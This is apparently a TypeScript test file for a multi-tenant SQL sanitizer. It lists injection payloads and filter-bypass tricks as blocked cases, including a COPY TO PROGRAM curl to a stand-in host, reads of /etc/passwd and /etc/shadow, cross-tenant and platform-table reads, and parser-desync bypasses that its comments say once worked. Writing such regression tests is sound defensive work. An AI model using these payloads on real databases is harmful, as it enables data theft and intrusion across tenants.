// @vitest-environment node
import { describe, it, expect } from 'vitest';
import {
  sanitizeSqlForTenant,
  quotePgIdent,
  isSafeDefault,
  referencesForeignSchema,
} from './db-browser';

const TENANT = 'p_0123456789abcdef0123456789abcdef';

describe('sanitizeSqlForTenant — allowed statements', () => {
  it('accepts a plain SELECT against the tenant schema', () => {
    expect(sanitizeSqlForTenant('SELECT * FROM users', TENANT)).toBe('SELECT * FROM users');
  });

  it('accepts a CTE', () => {
    const sql = 'WITH recent AS (SELECT id FROM orders) SELECT * FROM recent';
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('accepts tenant self-qualification', () => {
    const sql = `SELECT * FROM ${TENANT}.users`;
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('allows string literals containing SQL keywords', () => {
    // The keyword here is inside a literal, not a statement.
    const sql = "SELECT * FROM notes WHERE body = 'please DROP TABLE later'";
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('strips a single trailing semicolon', () => {
    expect(sanitizeSqlForTenant('SELECT 1;', TENANT)).toBe('SELECT 1');
  });
});

describe('sanitizeSqlForTenant — blocked statements', () => {
  const blocked: Array<[string, string]> = [
    ['INSERT', 'INSERT INTO users (id) VALUES (1)'],
    ['UPDATE', 'UPDATE users SET admin = true'],
    ['DELETE', 'DELETE FROM users'],
    ['DROP', 'DROP TABLE users'],
    ['ALTER', 'ALTER TABLE users ADD COLUMN x int'],
    ['TRUNCATE', 'TRUNCATE users'],
    ['GRANT', 'GRANT ALL ON users TO public'],
    ['COPY', "COPY users TO PROGRAM 'curl evil.test'"],
    ['CREATE', 'CREATE TABLE evil (id int)'],
    ['multiple statements', 'SELECT 1; DROP TABLE users'],
    ['non-SELECT leading keyword', 'VACUUM FULL'],
    ['nested write via CTE', 'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x'],
  ];

  for (const [label, sql] of blocked) {
    it(`blocks ${label}`, () => {
      expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
    });
  }

  it('blocks filesystem and process functions', () => {
    expect(sanitizeSqlForTenant("SELECT pg_read_file('/etc/passwd')", TENANT)).toBeNull();
    expect(sanitizeSqlForTenant("SELECT pg_read_binary_file('/etc/shadow')", TENANT)).toBeNull();
    expect(sanitizeSqlForTenant("SELECT pg_ls_dir('/')", TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT pg_sleep(60)', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT pg_terminate_backend(1)', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT set_config($$x$$, $$y$$, false)', TENANT)).toBeNull();
  });

  it('blocks the XML-mapping family (foreign SQL hidden in a string literal)', () => {
    // Regression: the inner query lives inside a string literal, so literal
    // stripping + table-reference scanning never see it. Only the function
    // denylist can stop it.
    expect(
      sanitizeSqlForTenant(
        "SELECT query_to_xml('SELECT email FROM public.users', true, true, '') AS x",
        TENANT,
      ),
    ).toBeNull();
    expect(
      sanitizeSqlForTenant(
        "SELECT query_to_xmltype('table public.api_keys row', true, true, '')",
        TENANT,
      ),
    ).toBeNull();
    expect(sanitizeSqlForTenant("SELECT database_to_xml(true, true, '')", TENANT)).toBeNull();
    expect(sanitizeSqlForTenant("SELECT database_to_xmlschema(true, true, '')", TENANT)).toBeNull();
    expect(
      sanitizeSqlForTenant("SELECT schema_to_xml('public', true, true, '')", TENANT),
    ).toBeNull();
    expect(
      sanitizeSqlForTenant("SELECT cursor_to_xml('c'::refcursor, 10, true, true, '')", TENANT),
    ).toBeNull();
    // Whitespace/case variations must not slip past the token-boundary regex.
    expect(
      sanitizeSqlForTenant("SELECT QUERY_TO_XML ( 'SELECT 1', true, true, '' )", TENANT),
    ).toBeNull();
  });

  it('still allows read-only XML predicates on values (no relation access)', () => {
    // xpath/xml_is_well_formed* operate only on values already in the
    // statement — they cannot execute SQL or reach another schema, so they
    // are allowed for tenant queries over xml-typed columns.
    expect(sanitizeSqlForTenant("SELECT xpath('/a/b', doc) FROM docs", TENANT)).not.toBeNull();
    expect(sanitizeSqlForTenant("SELECT xml_is_well_formed('')", TENANT)).not.toBeNull();
  });

  it('still allows ordinary string literals in predicates', () => {
    expect(
      sanitizeSqlForTenant("SELECT * FROM users WHERE email = 'a@b.c'", TENANT),
    ).not.toBeNull();
  });

  it('accepts the UUID default the Database panel prefills', () => {
    // Regression: database-panel.tsx prefills `gen_random_uuid()` — the
    // allowlist must accept what the UI advertises (and what Postgres natively
    // provides) or every default table creation 400s.
    expect(isSafeDefault('gen_random_uuid()')).toBe(true);
    expect(isSafeDefault('now()')).toBe(true);
    expect(isSafeDefault('CURRENT_TIMESTAMP')).toBe(true);
    expect(isSafeDefault('42')).toBe(true);
    // Still rejects anything that could smuggle SQL into CREATE TABLE.
    expect(isSafeDefault('uuid_generate_v4()')).toBe(false);
    expect(isSafeDefault("nextval('evil')")).toBe(false);
    expect(isSafeDefault('1; DROP TABLE users')).toBe(false);
  });

  it('blocks advisory-lock functions (session and xact variants)', () => {
    expect(sanitizeSqlForTenant('SELECT pg_try_advisory_lock(12345)', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT pg_advisory_unlock(12345)', TENANT)).toBeNull();
  });

  it('blocks platform schema and catalog access', () => {
    expect(sanitizeSqlForTenant('SELECT * FROM public.users', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT * FROM information_schema.tables', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT * FROM pg_catalog.pg_tables', TENANT)).toBeNull();
    expect(sanitizeSqlForTenant('SELECT * FROM pg_shadow', TENANT)).toBeNull();
  });

  it('blocks another tenant schema (cross-tenant read)', () => {
    const otherTenant = 'p_fedcba9876543210fedcba9876543210';
    expect(sanitizeSqlForTenant(`SELECT * FROM ${otherTenant}.users`, TENANT)).toBeNull();
  });

  it('blocks cross-tenant access hidden in a quoted identifier', () => {
    expect(sanitizeSqlForTenant('SELECT * FROM "public"."api_keys"', TENANT)).toBeNull();
  });

  it('blocks cross-tenant access inside a subquery', () => {
    const sql = `SELECT * FROM users WHERE id IN (SELECT id FROM other.accounts)`;
    expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
  });

  it('blocks cross-tenant access behind a JOIN', () => {
    const sql = `SELECT * FROM users u JOIN other.secrets s ON s.id = u.id`;
    expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
  });

  it('blocks keyword smuggling through a comment', () => {
    // Comments are stripped before inspection, so the real statement is checked.
    expect(sanitizeSqlForTenant('SELECT 1 --\n; DROP TABLE users', TENANT)).toBeNull();
  });

  it('blocks dollar-quoted bodies that hide a second statement', () => {
    const sql = 'SELECT $tag$ ; DELETE FROM users $tag$';
    // A dollar-quoted literal is stripped, but the embedded terminator means
    // this must not be treated as a clean single SELECT either.
    const result = sanitizeSqlForTenant(sql, TENANT);
    expect(result === null || !result.includes('DELETE')).toBe(true);
  });
});

describe('sanitizeSqlForTenant — table-reference bypass regressions', () => {
  const OTHER = 'p_fedcba9876543210fedcba9876543210';

  const blocked: Array<[string, string]> = [
    ['ONLY before the schema', `SELECT * FROM ONLY ${OTHER}.users`],
    ['ONLY inside a subquery', `SELECT * FROM (SELECT * FROM ONLY ${OTHER}.users) q`],
    ['ONLY after a JOIN', `SELECT * FROM users u JOIN ONLY ${OTHER}.secrets s ON true`],
    ['parenthesized table reference', `SELECT * FROM (${OTHER}.users)`],
    ['comma-separated table list', `SELECT * FROM users, ${OTHER}.secrets`],
    [
      'comma after an ON clause',
      `SELECT * FROM users u JOIN notes n ON true, ONLY ${OTHER}.secrets`,
    ],
    ['subquery column list with a comma', `SELECT * FROM (SELECT a, b FROM ${OTHER}.users) q`],
    ['CTE that hides the outer table', `WITH x AS (SELECT 1) SELECT * FROM ${OTHER}.users`],
    ['missing whitespace before FROM', `SELECT * FROM (SELECT 1)FROM ${OTHER}.users`],
    ['missing whitespace after FROM', `SELECT *FROM ${OTHER}.users`],
    ['leading keyword without whitespace', `SELECT*FROM ${OTHER}.users`],
    ['quoted schema with a keyword-named table', `SELECT * FROM "${OTHER}"."from"`],
    ['quoted schema and table', `SELECT * FROM "${OTHER}"."users"`],
    // `TABLE relation_expr` is a second SELECT form: it names a relation with no
    // FROM/JOIN token at all, so a position-based scan that only looks after
    // FROM/JOIN/comma never inspects it. Confirmed exploitable before the fix
    // (PostgreSQL executes these and returns the other schema's rows).
    ['TABLE select form in a subquery', `SELECT * FROM (TABLE ${OTHER}.users) x`],
    ['TABLE select form behind EXISTS', `SELECT 1 WHERE EXISTS (TABLE ${OTHER}.users)`],
    ['TABLE select form inside a CTE', `WITH x AS (TABLE ${OTHER}.users) SELECT * FROM x`],
    ['bare TABLE statement', `TABLE ${OTHER}.users`],
    ['TABLE select form after ONLY', `SELECT * FROM (TABLE ONLY ${OTHER}.users) x`],
    ['TABLE select form with a quoted schema', `SELECT * FROM (TABLE "${OTHER}".users) x`],
  ];

  for (const [label, sql] of blocked) {
    it(`blocks ${label}`, () => {
      expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
    });
  }

  const allowed: Array<[string, string]> = [
    ['self-qualified ONLY', `SELECT * FROM ONLY ${TENANT}.users`],
    ['self-qualified parenthesized reference', `SELECT * FROM (${TENANT}.users)`],
    ['self-qualified comma list', `SELECT * FROM ${TENANT}.users, ${TENANT}.notes`],
    ['self-qualified reference without whitespace', `SELECT *FROM ${TENANT}.users`],
    ['parenthesized subquery with a comma', `SELECT * FROM (SELECT a, b FROM ${TENANT}.users) q`],
    ['quoted keyword table name', 'SELECT * FROM "from"'],
    ['quoted alias named from', 'SELECT * FROM users AS "from" WHERE "from".id = 1'],
    ['set-returning function with a comma', 'SELECT * FROM generate_series(1, 3) AS n'],
  ];

  for (const [label, sql] of allowed) {
    it(`allows ${label}`, () => {
      expect(sanitizeSqlForTenant(sql, TENANT)).not.toBeNull();
    });
  }
});

describe('sanitizeSqlForTenant — dollar quotes and unterminated constructs', () => {
  const OTHER = 'p_fedcba9876543210fedcba9876543210';
  const blocked: Array<[string, string]> = [
    // Regression: `$$` is the EMPTY dollar-quote tag. The stripper used to
    // copy the first `$` literally, then derive the bogus tag `$a$` from the
    // second, fail to find its close, and discard the rest of the statement —
    // so every guard below saw only `SELECT $` while PostgreSQL executed the
    // whole query. Any project VIEWER could read platform tables this way.
    [
      'empty dollar tag erasing a platform schema',
      'SELECT $$a$$, session_token FROM public.sessions',
    ],
    [
      'empty dollar tag erasing a forbidden function',
      "SELECT $$a$$, pg_read_file('/etc/passwd') FROM users",
    ],
    ['empty dollar tag erasing another tenant', `SELECT $$a$$, x FROM ${OTHER}.users`],
    ['unterminated single-quoted literal', "SELECT 'abc, x FROM public.users"],
    // Regression: the old `"` branch copied an unterminated identifier body
    // verbatim, so `FROM users` survived as one quoted word and the table
    // scanner found no schema introducer — the statement was ALLOWED.
    // (`SELECT "abc FROM public.users` is NOT this case: `public` was already
    // caught by the platform pattern before the unterminated-identifier fix.)
    ['unterminated quoted identifier swallowing the FROM', 'SELECT "abc, x FROM users'],
    ['unterminated block comment', 'SELECT 1 /* , x FROM public.users'],
    ['unterminated named dollar tag', 'SELECT $tag$, x FROM public.users'],
    // Regression: PostgreSQL block comments NEST, so the first `*/` does not
    // end the comment. The old scan stopped there and the apostrophe in `it's`
    // then opened a phantom literal that swallowed the platform reference to
    // end of input — ALLOWED, and the remainder `SELECT 1 , (SELECT …)` is
    // executable (a leading comma would be a syntax error, so the exploit
    // needs a select item before it). Depth tracking exposes `public.users`.
    [
      'nested block comment hiding a platform schema',
      "SELECT 1 /* /* */ it's */ , (SELECT x FROM public.users)",
    ],
    // `scan.l` state `<xe>` consumes `\` plus the next character inside
    // `E'…'`, so `\'` is content and only the FINAL quote terminates. The old
    // scanner had no E-string rule: it ended the literal at the `\'` quote and
    // desynchronized the scan. On these inputs the true terminator follows
    // immediately, so the old extent accidentally matched the server's and the
    // reference stayed exposed — both pass against the old code. They are
    // behavior locks, not regression proofs: the reference between two
    // complete E-strings is live SQL to PostgreSQL and must stay blocked.
    [
      'E-string backslash escape hiding a platform schema',
      "SELECT E'a\\'' AS p, (SELECT session_token FROM public.sessions LIMIT 1) AS q, E'b\\'' AS r",
    ],
    [
      'E-string backslash escape hiding another tenant',
      `SELECT E'a\\'' AS p, (SELECT x FROM ${OTHER}.users LIMIT 1) AS q, E'b\\'' AS r`,
    ],
    // Regression: `scan.l` defines `comment ("--"{non_newline}*)` with
    // `non_newline [^\n\r]`, so a bare CR ends the comment on the server while
    // the scanner blanked everything after it — ALLOWED, and the wrapping
    // `SELECT * FROM (…) AS _q` then read the platform table.
    ['CR-terminated line comment hiding a platform schema', 'SELECT 1 -- x\rFROM public.sessions'],
    ['CR-terminated line comment hiding another tenant', `SELECT 1 -- x\rFROM ${OTHER}.users`],
    [
      'CR-terminated line comment hiding a forbidden function',
      "SELECT 1 -- x\r, pg_read_file('/etc/passwd')",
    ],
  ];

  for (const [label, sql] of blocked) {
    it(`blocks ${label}`, () => {
      expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
    });
  }

  const allowed: Array<[string, string]> = [
    ['empty dollar-quoted literal', 'SELECT $$a$$ AS label, id FROM users'],
    ['named dollar-quoted literal', 'SELECT $tag$hello$tag$ AS label FROM users'],
    ['escaped single quote inside a literal', "SELECT 'it''s' AS s, id FROM users"],
    ['escaped quote inside an identifier', 'SELECT "a""b" FROM users'],
    ['positional parameter placeholder', 'SELECT $1 AS param'],
    ['nested block comment that does close', 'SELECT /* a /* b */ c */ 1 FROM users'],
    ['E-string with a backslash escape', "SELECT E'a\\tb' AS label, id FROM users"],
    // `U&'…'` (`<xus>`) and `U&"…"` (`<xui>`) have NO backslash rule in
    // `scan.l` — the lexer ends them at the first unpaired quote like any other
    // literal — so the scanner must not treat them as escape strings.
    ['unicode-escape string literal', "SELECT U&'d!0061t!+000061' UESCAPE '+' AS label FROM users"],
    // `dolq_start`/`dolq_cont` admit every byte >= 0x80, so `$té$` is a real
    // tag. An ASCII-only match left the BODY unstripped and scanned it as live
    // SQL, which rejected valid queries two ways: an apostrophe inside the body
    // opened a phantom literal running to EOF, and a keyword inside it tripped
    // the forbidden-keyword check. (The tag itself must stay quote-free:
    // `dolq_cont` excludes `'`, so `$t'é$` is `{dolqfailed}` — a bare `$`
    // followed by an identifier — and PostgreSQL parses it as ordinary text.)
    ['apostrophe inside a non-ASCII dollar body', "SELECT $té$ it's fine $té$ FROM users"],
    [
      'forbidden keyword inside a non-ASCII dollar body',
      'SELECT $té$ DROP TABLE x $té$ AS label FROM users',
    ],
    // flex takes the longest match, so `WHERE` is one keyword token and the
    // literal after it is an ORDINARY string — `\'` does not escape there, and
    // the literal ends at the first unpaired quote. Treating it as an E-string
    // would swallow `= ` into a phantom literal and reject valid SQL.
    ['identifier ending in E immediately before a literal', "SELECT * FROM users WHERE'a\\' = 'b'"],
  ];

  for (const [label, sql] of allowed) {
    it(`allows ${label}`, () => {
      expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
    });
  }
});

describe('sanitizeSqlForTenant — identifier-encoding and regclass bypasses', () => {
  const OTHER = 'p_fedcba9876543210fedcba9876543210';
  const blocked: Array<[string, string]> = [
    // Regression: `U&"…"` is a single IDENT token to PostgreSQL (unicode-escape
    // delimited identifier) but three tokens to the table scanner, so neither
    // referencesForeignSchema nor the platform patterns ever saw the qualifier.
    [
      'unicode-escape identifier qualifying another tenant schema',
      `SELECT * FROM U&"${OTHER}"."users"`,
    ],
    // `p\0075blic` decodes to `public` server-side; the raw text never contains
    // the platform name, so only an outright rejection of the construct helps.
    [
      'unicode-escape identifier hiding a platform schema name behind \\0075 escapes',
      'SELECT * FROM U&"p\\0075blic"."sessions"',
    ],
    ['lowercase unicode-escape identifier', `SELECT * FROM u&"${OTHER}"."users"`],
    ['unicode-escape identifier after an opening paren', `SELECT * FROM (U&"${OTHER}"."users") x`],
    // Regression: the call-site regex anchors on `fn\s*\(`, but after a quoted
    // name comes `"` — matching neither — so quoting a forbidden function
    // defeated the check while PostgreSQL still resolves the lowercase name.
    [
      'quoted forbidden function name',
      `SELECT "query_to_xml"('SELECT email FROM ${OTHER}.users', true, true, '')`,
    ],
    [
      'quoted forbidden function with a space before the paren',
      `SELECT "dblink" ('host=x dbname=y', 'SELECT 1')`,
    ],
    // Regression: sequence functions resolve a regclass from a string literal,
    // which stripSqlLiterals deliberately blanks — the schema-qualified target
    // was invisible to every guard, so a VIEWER could mutate or read another
    // tenant's sequences.
    ['setval on another tenant sequence', `SELECT setval('${OTHER}.users_id_seq', 1)`],
    ['nextval on another tenant sequence', `SELECT nextval('${OTHER}.users_id_seq')`],
    ['currval on another tenant sequence', `SELECT currval('${OTHER}.users_id_seq')`],
    ['quoted sequence function', `SELECT "setval"('${OTHER}.users_id_seq', 1)`],
    // Literal arguments are opaque to the guards, so the denial cannot be
    // scoped to foreign schemas — own-schema calls are rejected too.
    ['nextval even on the tenant schema itself', `SELECT nextval('${TENANT}.users_id_seq')`],
  ];

  for (const [label, sql] of blocked) {
    it(`blocks ${label}`, () => {
      expect(sanitizeSqlForTenant(sql, TENANT)).toBeNull();
    });
  }

  it('allows U&" inside a string literal — the body is blanked before the check', () => {
    const sql = `SELECT * FROM users WHERE bio = 'try U&"x" for unicode'`;
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('allows U&" inside a comment', () => {
    const sql = 'SELECT id /* U&"x" */ FROM users';
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('allows a quoted identifier that merely contains U&', () => {
    const sql = 'SELECT * FROM "U&x"';
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });

  it('allows quoted identifiers around non-forbidden names', () => {
    const sql = 'SELECT "lower"(name) FROM "users"';
    expect(sanitizeSqlForTenant(sql, TENANT)).toBe(sql);
  });
});

describe('referencesForeignSchema — scanner layer', () => {
  const OTHER = 'p_fedcba9876543210fedcba9876543210';

  // These assert the table-reference scanner directly, so the guard still holds
  // if `TABLE` is ever removed from FORBIDDEN_SQL_KEYWORDS. `sanitizeSqlForTenant`
  // rejects these too, but via the keyword backstop rather than the scanner.
  it('detects a foreign schema introduced by the TABLE select form', () => {
    expect(referencesForeignSchema(`SELECT * FROM (TABLE ${OTHER}.users) x`, TENANT)).toBe(true);
    expect(referencesForeignSchema(`SELECT 1 WHERE EXISTS (TABLE ${OTHER}.users)`, TENANT)).toBe(
      true,
    );
    expect(
      referencesForeignSchema(`WITH x AS (TABLE ${OTHER}.users) SELECT * FROM x`, TENANT),
    ).toBe(true);
    expect(referencesForeignSchema(`TABLE ${OTHER}.users`, TENANT)).toBe(true);
    expect(referencesForeignSchema(`SELECT * FROM (TABLE ONLY ${OTHER}.users) x`, TENANT)).toBe(
      true,
    );
  });

  it('does not flag unqualified names or the tenant own schema', () => {
    expect(referencesForeignSchema(`SELECT * FROM (TABLE ${TENANT}.users) x`, TENANT)).toBe(false);
    expect(referencesForeignSchema('SELECT * FROM users', TENANT)).toBe(false);
    expect(referencesForeignSchema('SELECT u.id FROM users u WHERE u.id = 1', TENANT)).toBe(false);
    expect(referencesForeignSchema(`SELECT * FROM ${TENANT}.users, ${TENANT}.notes`, TENANT)).toBe(
      false,
    );
    // `table` is not an identifier here — only the reserved-word form is scanned.
    expect(referencesForeignSchema('SELECT table_name FROM users', TENANT)).toBe(false);
  });
});

describe('quotePgIdent', () => {
  it('quotes valid identifiers', () => {
    expect(quotePgIdent('users')).toBe('"users"');
  });

  it('rejects identifiers that could break out of quoting', () => {
    expect(() => quotePgIdent('users"; DROP TABLE x; --')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('Users')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('1users')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('')).toThrow(/Invalid SQL identifier/);
    expect(() => quotePgIdent('a'.repeat(64))).toThrow(/Invalid SQL identifier/);
  });
});

describe('isSafeDefault', () => {
  it('accepts a small allowlist of defaults', () => {
    expect(isSafeDefault('NULL')).toBe(true);
    expect(isSafeDefault('true')).toBe(true);
    expect(isSafeDefault('now()')).toBe(true);
    expect(isSafeDefault('CURRENT_TIMESTAMP')).toBe(true);
    expect(isSafeDefault('42')).toBe(true);
    expect(isSafeDefault("'hello world'")).toBe(true);
  });

  it('rejects SQL smuggled through a DEFAULT expression', () => {
    expect(isSafeDefault('1); DROP TABLE users; --')).toBe(false);
    expect(isSafeDefault("pg_read_file('/etc/passwd')")).toBe(false);
    expect(isSafeDefault("'; DELETE FROM users; --")).toBe(false);
    expect(isSafeDefault('(SELECT 1)')).toBe(false);
  });
});
